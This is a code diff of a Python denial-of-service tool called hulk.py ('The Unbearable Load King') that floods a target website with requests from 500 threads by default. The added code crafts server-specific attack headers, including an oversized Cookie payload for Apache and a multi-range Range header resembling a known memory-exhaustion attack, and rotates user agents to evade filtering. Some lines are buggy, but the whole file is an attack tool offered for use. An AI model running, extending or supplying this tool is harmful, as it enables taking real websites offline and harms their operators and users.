@@ -1,117 +1,130 @@
+#!/usr/bin/env python
+
+"""THE UNBEARABLE LOAD KING
+Usage:
+  hulk.py <site> [--thread=<t>] [--quiet]
+  hulk.py (-h | --help)
+  hulk.py --version
+
+Options:
+  -h --help         Show this screen.
+  --version         Show version.
+  -q --quiet        Omit banner
+  -t --thread=<t>   Number of threads to use [default: 500]
+"""
 ## imports
+from docopt import docopt
 from load import doser
 import threading
 import random
 import string
 import sys
-import re
-import argparse
+from functools import partial
 from banner import asciiart
-
-## Banner printing out
-def banner():
-    asciiart()
 
 ## Generating random strings
 def asciigen(size):
     result_str = ''.join(random.choice(string.ascii_uppercase) for i in range(size))
     return result_str
 
-## sending requests to the site to get what method it uses
-def httpcall(url):
+def generate_ua():
+    with open('headeruseragents.txt', 'r') as r:
+        headerUseragents = r.read().replace(",", '').split()
+    return headerUseragents
 
-    if '?' in url:
-        param_joiner = '&'
+##Generate referers for apache
+def generate_referers():
+    with open('headersReferers.txt', 'r') as f:
+        referers = f.read().replace(",", '').split()
+    return referers
+
+## Generate payload
+def generate_payload():
+    if httpcall.ping.headers['server'] == 'Apache':
+        return [hex(x) for x in range(0,pow(2, 16))]
     else:
-        param_joiner = '?'
+        return "bytes=0-,%s" % ",".join("5-%d" % item for item in range(1, 1024))
+
+##Generate headers
+def generate_headers(host):
+    payload = "".join(generate_payload())
+    if httpcall.ping.headers['server'] == 'Apache':
+        headers = { 'Host': host, 'User-Agent': random.choice(generate_ua()), 'Cookie': payload, 'Accept-Encoding': 'gzip, deflate, br'}
+        return headers
+    else:
+        headers = { 'Host': host, 'User-Agent': random.choice(generate_ua()), 'Range': payload, 'Accept-Encoding': 'gzip, deflate' }
+        return headers
+
+## sending requests to the site to get what method it uses
+def httpcall(DOS, url):
+
+    httpcall.param_joiner = '&' if '?' in url else "?"
+
     try:
-        httpcall.ping = DOS.get(url + param_joiner + asciigen(random.randint(3,10)) + '=' + asciigen(random.randint(3,10)))
+        httpcall.ping = DOS.get(url)
+
         return httpcall.ping.status_code
+
     except Exception as e:
         print(e)
 
-## Act according to the code recieved
-def method(url):
-    code = httpcall(url)
+##Calling the method
+def method(DOS, url):
+    code = httpcall(DOS, url)
     if code == 405:
         try:
             send = DOS.post(url , data="etc")
-            print("Response code from the website : ",send.status_code)
+            print(f"========\nResponse code from the website :{send.status_code}\n==========")
         except:
             print("Site not accepting requests")
             sys.exit()
+    elif httpcall.ping.headers['server'] == 'Apache':
+        try:
+            send = DOS.get(url , data=generate_headers(url.replace('https' or 'http', '')))
+            print(f"========\nResponse code from the website :{send.status_code}\n==========")
+        except Exception as e:
+            print(e)
+    elif httpcall.ping.headers['server'] == 'Microsoft-IIS/10':
+        try:
+            send = DOS.get(url , data=generate_headers(url.replace('https' or 'http', '')))
+            print(f"========\nResponse code from the website :{send.status_code}\n==========")
+        except Exception as e:
+            print(e)
     else:
         try:
-            send = httpcall.ping
-            print("Response code from the website : ",send.status_code)
+            send = DOS.get(url+ httpcall.param_joiner + asciigen(random.randint(3,10)) + '=' + asciigen(random.randint(3,10)))
+            print(f"========\nResponse code from the website :{send.status_code}\n==========")
         except Exception as e:
             print(e)
             sys.exit()
 
-## Dosing the site
-class Dos(threading.Thread):
-    def run(self):
-        try:
-            while True:
-                method(main.url)
-        except:
-            pass
+def dos(DOS, url, repeat):
+    try:
+        for i in range(repeat):
+            method(DOS, url)
+    except:
+        pass
 
-## added argparse for easier user interaction
-def get_parser():
-    
-    parser = argparse.ArgumentParser(description="THE UNBEARABLE LOAD KING")
-    group = parser.add_mutually_exclusive_group(required=False)
-    group.add_argument(
-        "-s",
-        "--site",
-        metavar="https://example.com",
-        type=str,
-        help="Site to target",
-    )
-    group.add_argument(
-        "-t",
-        "--threads",
-        metavar = 500,
-        type = int,
-        help = "Number of threads for the program to run on"
-    )
-    group.add_argument(
-        "-v", "--version", action="store_true", help="Show the version of this program."
-    )
-    parser.add_argument(
-        "-q", "--quiet", action="store_true", help="Quiet mode (don't print banner)"
-    )
+def main(site, thread_count, quiet):
+    if not quiet:
+        asciiart()
 
-    return parser
+        # TODO: change None, None to doser(), Encoder()
+    dos_func = partial(dos, doser(), site, 500)
+    threads = []
+    for _ in range(thread_count):
+        threads.append(threading.Thread(target=dos_func, daemon=True))
+        threads[-1].start()
 
-## main functions after the user inputs
-def main():
-
-    parser = get_parser()
-    args = parser.parse_args()
-
-    if not args.quiet:
-        banner()
-    
-    if args.version:
-        print(_version_)
-    
-    elif args.site:
-        if args.threads:
-            thread=args.threads
-        else:
-            thread = 500
-        main.url = args.site
-        for i in range(thread):
-            t = Dos()
-            t.start()
-    else:
-        parser.print_help()
+    try:
+        for thread in threads:
+            thread.join()
+    except KeyboardInterrupt:
+        print("Stoping...")
 
 if __name__ == "__main__":
-    _version_ = "1.0.2"
-    DOS = doser()
-    main()
+    args = docopt(__doc__, version='1.0.2')
 
-
+    main(args["<site>"],
+        int(args["--thread"]),
+        args["--quiet"])
